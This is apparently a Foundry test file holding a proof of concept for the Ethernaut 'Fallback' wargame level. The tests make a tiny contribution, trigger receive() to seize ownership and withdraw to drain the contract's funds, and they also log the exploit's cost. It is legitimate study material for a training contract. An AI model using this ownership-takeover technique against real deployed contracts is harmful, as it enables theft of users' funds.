// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/02-Fallback/Fallback.sol";

/**
 * @title FallbackTest
 * @notice POC for Ethernaut Level 02 - Fallback
 * @dev Demonstrates the receive() function vulnerability
 */
contract FallbackTest is Test {
    Fallback public target;
    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = address(0x1);
        attacker = address(0x2);

        // Deploy contract as deployer
        vm.prank(deployer);
        target = new Fallback();

        // Fund contract with some ETH
        vm.deal(address(target), 10 ether);

        // Give attacker some ETH
        vm.deal(attacker, 1 ether);

        console.log("=== Setup Complete ===");
        console.log("Fallback deployed at:", address(target));
        console.log("Deployer (owner):", deployer);
        console.log("Attacker:", attacker);
        console.log("Contract balance:", address(target).balance);
        console.log("Owner's contribution:", target.contributions(deployer));
    }

    /**
     * @notice Main exploit: Claim ownership via receive() and drain funds
     */
    function testCompleteExploit() public {
        console.log("\n=== Complete Exploit ===");

        // Initial state
        assertEq(target.owner(), deployer, "Initial owner should be deployer");
        assertEq(address(target).balance, 10 ether);

        // STEP 1: Make minimal contribution
        console.log("\n[STEP 1] Making minimal contribution...");
        uint256 minContribution = 0.0001 ether;

        vm.startPrank(attacker);
        target.contribute{value: minContribution}();

        uint256 attackerContribution = target.getContribution();
        console.log("Attacker's contribution:", attackerContribution);
        assertEq(attackerContribution, minContribution);

        // STEP 2: Trigger receive() to become owner
        console.log("\n[STEP 2] Triggering receive() function...");

        (bool success,) = address(target).call{value: 0.0001 ether}("");
        require(success, "ETH transfer failed");

        // Verify ownership change
        address newOwner = target.owner();
        console.log("New owner:", newOwner);
        assertEq(newOwner, attacker, "Attacker should be the new owner");
        console.log("[SUCCESS] Ownership claimed!");

        // STEP 3: Withdraw all funds
        console.log("\n[STEP 3] Withdrawing all funds...");
        uint256 contractBalanceBefore = address(target).balance;
        uint256 attackerBalanceBefore = attacker.balance;

        target.withdraw();
        vm.stopPrank();

        uint256 contractBalanceAfter = address(target).balance;
        uint256 attackerBalanceAfter = attacker.balance;

        console.log("Contract balance after:", contractBalanceAfter);
        console.log("Attacker gained:", attackerBalanceAfter - attackerBalanceBefore);

        assertEq(contractBalanceAfter, 0, "Contract should be drained");
        console.log("\n[SUCCESS] Contract drained!");
    }

    /**
     * @notice Test the impractical legitimate path
     */
    function testImpracticalPath() public {
        console.log("\n=== Impractical Path Analysis ===");

        uint256 ownerContribution = target.contributions(deployer);
        console.log("Owner's contribution:", ownerContribution);

        uint256 maxPerContribution = 0.001 ether;
        uint256 neededContributions = ownerContribution / maxPerContribution + 1;

        console.log("Max contribution per call:", maxPerContribution);
        console.log("Contributions needed:", neededContributions);
        console.log("This would require over 1,000,000 transactions!");
    }

    /**
     * @notice Test minimum exploit cost
     */
    function testMinimumExploitCost() public {
        console.log("\n=== Minimum Exploit Cost ===");

        // Minimum contribution
        uint256 contribution = 1 wei;
        vm.prank(attacker);
        target.contribute{value: contribution}();

        // Trigger receive with minimum amount
        uint256 triggerAmount = 1 wei;
        vm.prank(attacker);
        (bool success,) = address(target).call{value: triggerAmount}("");
        require(success);

        assertEq(target.owner(), attacker);

        uint256 totalCost = contribution + triggerAmount;
        console.log("Total exploit cost:", totalCost);
        console.log("That's only 2 wei to steal ownership!");
    }

    /**
     * @notice Test receive() conditions
     */
    function testReceiveConditions() public {
        console.log("\n=== Testing receive() Conditions ===");

        address newUser = address(0x3);
        vm.deal(newUser, 1 ether);

        // Test: msg.value > 0
        console.log("\nTest 1: Sending 0 ETH (should fail)");
        vm.prank(attacker);
        target.contribute{value: 0.0001 ether}();

        vm.prank(attacker);
        (bool success1,) = address(target).call{value: 0}("");
        assertFalse(success1, "Should fail with 0 value");
        console.log("Failed as expected");

        // Test: contributions[msg.sender] > 0
        console.log("\nTest 2: No prior contribution (should fail)");
        vm.prank(newUser);
        (bool success2,) = address(target).call{value: 0.0001 ether}("");
        assertFalse(success2, "Should fail without prior contribution");
        console.log("Failed as expected");

        // Test: both conditions met
        console.log("\nTest 3: Both conditions met (should succeed)");
        vm.prank(newUser);
        target.contribute{value: 1 wei}();

        vm.prank(newUser);
        (bool success3,) = address(target).call{value: 1 wei}("");
        assertTrue(success3, "Should succeed");
        assertEq(target.owner(), newUser);
        console.log("Success! New user is owner");
    }

    /**
     * @notice Negative test: Cannot withdraw without ownership
     */
    function testCannotWithdrawWithoutOwnership() public {
        console.log("\n=== Cannot Withdraw Without Ownership ===");

        vm.prank(attacker);
        vm.expectRevert("caller is not the owner");
        target.withdraw();

        console.log("Cannot withdraw without ownership");
    }
}
